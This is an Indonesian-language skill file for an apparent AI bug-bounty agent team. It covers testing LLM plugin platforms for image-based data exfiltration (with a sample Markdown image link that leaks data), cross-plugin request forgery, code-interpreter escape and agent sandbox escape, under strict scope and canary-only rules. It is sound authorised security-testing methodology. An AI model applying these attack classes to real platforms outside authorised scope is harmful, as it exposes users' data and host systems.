# Skill: Keamanan Plugin & Platform LLM — Ekosistem Plugin, Interpreter, Sandbox Agen

> **BELUM DIUJI — dibangun dari riset, bukan pengalaman teruji.** Seluruh isi di bawah ini adalah metodologi pengujian dari riset (referensi: `corca-ai/awesome-llm-security`, paper "LLM Platform Security: ChatGPT Plugins", artikel "ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery", "Jailbreaking GPT-4's code interpreter", "Hacking Auto-GPT"), bukan pengalaman teruji sampai ada temuan yang lolos triase dan dicatat di log. Label ini berlaku untuk semua bagian.

## Pemicu (kapan dipakai)

- Target in-scope adalah platform LLM dengan ekosistem plugin (plugin pihak ketiga, code interpreter, agen otonom seperti Auto-GPT).
- Perlu menguji otorisasi antar-plugin, eksfiltrasi lewat plugin/gambar, atau pelarian dari sandbox agen.
- Perlu menguji penyalahgunaan code interpreter atau alat eksekusi kode di platform LLM.
- Dipakai saat targetnya BUKAN model mentah, melainkan platform + plugin di sekelilingnya.

## Pemilik + penanggung jawab

| Peran | Agent | Tugas |
|---|---|---|
| Pengerjaan | **A54** | Menguji keamanan plugin/platform terhadap target in-scope |
| Audit | **A60 Security Auditor** | Memeriksa apakah bukti tiap temuan memenuhi gerbang validasi |
| Pemimpin | **Muse** | Memutuskan temuan mana yang maju ke triase |

## Sudah tercakup (jangan diduplikat)

- Penyalahgunaan tool oleh agen secara umum → skill `penyalahgunaan-tool-agen`.
- Jalur keluar data via konteks/RAG/integrasi secara umum → skill `eksfiltrasi-data-ai`.
- Eksekusi kode tak aman via input (RCE klasik) → skill `injeksi-perintah-rce`.
- Audit arsitektur RAG/LLM → skill `audit-rag-llm` (arsitektur; skill ini spesifik ekosistem plugin/platform: otorisasi antar-plugin, interpreter, sandbox agen).

## Aturan keras

1. **Hanya program bounty resmi in-scope** (Muse/Meta, OpenAI Safety, 0din, Google AI VRP, ViKernel, huntr). Pastikan platform/plugin/fitur AI berada dalam in-scope program sebelum pengujian dimulai. **Plugin pihak ketiga HANYA diuji bila program secara eksplisit mencantumkannya dalam scope** — plugin di luar scope jangan disentuh.
2. **Hanya akun sendiri + canary palsu.** Gunakan hanya data uji milik sendiri (test accounts terpisah) saat menguji plugin/platform.
3. **Tanpa data orang lain.**
4. **Tanpa uji korban (victim-agent fraud tests DIBLOKIR — jangan dicoba).**
5. **Tanpa DoS / resource exhaustion** — dilarang pengujian yang mengganggu ketersediaan layanan atau menghabiskan kuota token secara berlebihan.
6. **Tanpa payload di permukaan publik.**
7. **Validasi human-in-the-loop (AI bantu, manusia putuskan dan validasi).**
8. **Tanpa laporan tanpa persetujuan Cipta.**
9. **Patuhi larangan otomasi program (huntr "Humans only"; Gray Swan dilewati total — jangan buat skill untuknya).**
10. **Larang aksi destruktif (DROP, DELETE, hapus/ubah data)** — pembuktian harus aman dan read-only (bukti baca, callback canary, document.domain). **Khusus sandbox/interpreter: jangan menghapus atau mengubah file di luar direktori uji sendiri.**
11. **Aturan program AI:** Google AI VRP — direct injection/jailbreak/halusinasi/system-prompt-leak out of scope (Tim 4 analisis format saja, tanpa payload); 0din — Prompt Extraction N/A untuk Muse Spark; beberapa program membatasi pengujian otomatis pada endpoint inferensi — sesuaikan ruang lingkup dengan aturan spesifik program sebelum menguji.

## Langkah + gerbang

### Gerbang 1 — Petakan ekosistem plugin/platform target

1. Daftar plugin yang terpasang/ tersedia di platform target in-scope, beserta izin tiap plugin (data apa yang bisa dibaca, aksi apa yang bisa dilakukan).
2. Petakan alur data antar-plugin: plugin A bisa memanggil/memengaruhi plugin B? Apakah ada otorisasi antar-plugin atau semua plugin saling percaya?
3. Identifikasi code interpreter / alat eksekusi kode dan sandbox agen (bila ada): apa batas sandboxnya, file/jaringan apa yang bisa dijangkau?
4. Catat peta ini di log — pengujian tanpa peta = menebak-nebak.

### Gerbang 2 — Uji empat kelas serangan platform

Uji SATU kelas per putaran, dengan akun uji sendiri dan canary palsu.

**A. Eksfiltrasi data lewat plugin dan gambar:** minta plugin menampilkan data uji (canary) lewat kanal yang bocor — mis. gambar Markdown yang dirender (`![x](https://server-sendiri/?data=...)`) atau respons plugin yang menyertakan data ke pihak ketiga. Indikator: canary milik sendiri terlihat keluar ke server canary milik sendiri. Pembuktian HANYA di sesi/browser sendiri — jangan libatkan korban.

**B. Cross-plugin request forgery:** minta plugin A (berizin rendah) memicu aksi plugin B (berizin tinggi) tanpa otorisasi pengguna — mis. plugin membaca data lalu plugin lain mengirimnya keluar. Indikator: aksi plugin B berhasil tanpa konfirmasi/izin yang seharusnya ada.

**C. Penyalahgunaan code interpreter:** uji apakah interpreter bisa dipakai keluar dari batas yang dimaksud — membaca file di luar direktori uji sendiri, mengakses jaringan internal, atau mengeksekusi perintah sistem. Indikator: baca file canary di luar direktori uji / callback canary ke server sendiri dari dalam interpreter. **BATAS: jangan membaca data pengguna lain; hanya file canary milik sendiri yang diletakkan di luar direktori uji.**

**D. Pelarian dari sandbox agen (mis. Auto-GPT):** uji apakah agen otonom bisa keluar dari sandboxnya — mengakses file, kredensial, atau jaringan host yang seharusnya terisolasi. Indikator: agen membaca file canary di host / memanggil URL canary milik sendiri dari luar sandbox. **BATAS: hanya di lingkungan uji sendiri atau target in-scope yang mengizinkan; jangan menyerang host produksi.**

### Gerbang 3 — Verifikasi dengan efek nyata

1. Tiap kelas yang menunjukkan indikasi: uji ulang 3× dengan akun uji sendiri.
2. Temuan valid HANYA bila efek nyata terbukti (canary keluar, aksi tanpa izin berhasil, file di luar batas terbaca) — bukan sekadar "plugin menjawab dengan aneh".
3. Catat plugin dan versi yang terlibat — laporan tanpa nama plugin/versi tidak bisa ditindaklanjuti.

### Gerbang 4 — Bedakan temuan benar dari false positive

| Gejala | Penilaian |
|---|---|
| Plugin menampilkan data tapi hanya di sesi sendiri dan tidak keluar ke mana pun | Bukan temuan — tidak ada kebocoran |
| Aksi plugin B berhasil tapi ternyata sudah ada izin pengguna sebelumnya | Bukan temuan — otorisasi memang ada |
| Canary keluar / aksi tanpa izin berhasil / file di luar batas terbaca, dapat diulang 3× | Kandidat temuan — lanjut ke `penilaian-cvss` → `artikulasi-dampak-bisnis` → `triase-duplikat` → `laporan-poc-otomatis` → audit A60 → persetujuan Cipta |
| Hasil berubah-ubah antar putaran tanpa perubahan input | Perilaku probabilistik — ulangi 3×; gagal direproduksi 3× = TOLAK |

## Alat

| Alat | Cara pakai |
|---|---|
| Akun uji sendiri (dua akun bila perlu: User A / User B) | Wajib untuk Gerbang 2; milik sendiri |
| Server canary milik sendiri | Satu-satunya tujuan eksfiltrasi uji; catat callback canary |
| Canary palsu (string non-sensitif) | Satu-satunya data yang disisipkan ke input uji |
| File canary di luar direktori uji | Untuk uji interpreter/sandbox; file milik sendiri |
| Log HTTP mentah | Simpan request/response sebagai bukti; berikan hanya reference ID ke LLM saat menyusun laporan |
| `~/workspace/catatan/log-bug-bounty.md` | Log peta plugin + hasil tiap kelas + keputusan gerbang |

## Format output

Tulis ke `~/workspace/catatan/log-bug-bounty.md` (bagian per tanggal) dengan format:

```
Target: [program + platform/plugin]
Peta plugin: [plugin + izin] | [alur antar-plugin] | [interpreter/sandbox]
Kelas diuji: [A/B/C/D + nama kelas]
Langkah reproduksi: [akun uji + langkah + log HTTP]
Efek teramati: [apa yang terjadi, persis]
Reproduksi: [x/3 putaran berhasil]
Keputusan gerbang: [lolos / ditolak + alasan]
Status: [dipetakan / diuji / terbukti / dilaporkan / ditolak]
```

Format judul laporan (bila maju): `[Platform/plugin target] - [Jenis serangan] menyebabkan [Dampak Spesifik]`.

## Batasan yang diketahui

- Metodologi ini dari riset (paper + artikel kasus nyata), bukan pengalaman teruji — tiap kelas butuh satu kasus nyata yang lolos triase sebelum label BELUM DIUJI dicabut.
- Plugin pihak ketiga HANYA diuji bila program secara eksplisit mencantumkannya dalam scope — plugin di luar scope jangan disentuh.
- Pembuktian eksfiltrasi HANYA di sesi/browser sendiri dengan server canary milik sendiri — jangan libatkan korban.
- Uji interpreter/sandbox: hanya file canary milik sendiri; jangan membaca data pengguna lain atau file produksi.
- Perilaku LLM probabilistik: satu kali percobaan tidak cukup — ulangi minimal 3×.

## Available connectors

- Browser (`browser.search`, `browser.open`) — riset paper/artikel keamanan plugin dan scope program.

## Websites

- Dokumentasi scope program bounty yang sedang diuji (per program, baca pasal scope sebelum menguji).

## Alternatives for better results

- Bila fokusnya penyalahgunaan tool agen secara umum (bukan plugin platform), pakai `penyalahgunaan-tool-agen`.
- Bila fokusnya jalur keluar data via RAG/integrasi, pakai `eksfiltrasi-data-ai`.
- Bila fokusnya RCE klasik via input, pakai `injeksi-perintah-rce`.
- Bila fokusnya kanal render gambar Markdown di sisi klien, lihat juga skill eksfiltrasi-markdown (kandidat G1, kelompok lain).
